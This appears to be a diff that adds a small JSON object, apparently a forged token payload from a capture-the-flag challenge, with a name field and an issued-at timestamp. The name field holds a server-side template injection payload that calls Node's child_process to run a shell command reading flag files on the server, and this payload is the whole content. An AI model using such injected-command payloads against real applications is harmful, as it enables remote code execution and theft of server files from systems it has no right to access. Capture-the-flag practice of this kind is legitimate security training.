@@ -1,0 +1,4 @@
+{
+  "name": "<%= process.mainModule.require('child_process').execSync('cat flag*') %>",
+  "iat": 1665160944
+}
